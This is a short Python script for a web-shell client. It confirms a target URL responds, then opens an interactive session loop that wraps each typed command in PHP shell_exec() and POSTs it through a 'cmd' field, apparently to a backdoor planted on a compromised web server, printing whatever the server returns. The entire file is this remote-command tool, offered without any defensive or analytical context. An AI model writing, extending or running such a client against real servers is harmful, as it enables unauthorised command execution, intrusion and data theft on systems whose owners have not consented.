import requests
import os
from termcolor import colored
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
class Connector:
    def __init__(self,url,password):
        self.url = url
        self.password = password
        self.content = ""
        self.data = {"cmd":"ls"}


    def connect(self):
        if requests.post(self.url).status_code == 200:
            print(f"{colored("[+]","blue",attrs=["bold"])} Connected to {colored(self.url,"green",attrs=["underline"])} !")
            while True:
                remote_cmd = input("[Session] > ")
                self.execute(remote_cmd)
        else:
            print(f"{colored("[-]","red",attrs=["bold"])} Connection to {colored(self.url,"red",attrs=["underline"])} failed.")

    def execute(self,cmd):
        cmd = f"shell_exec('{cmd}')"
        res = requests.post(self.url, {"cmd": f"echo {cmd};"})
        print(res.text)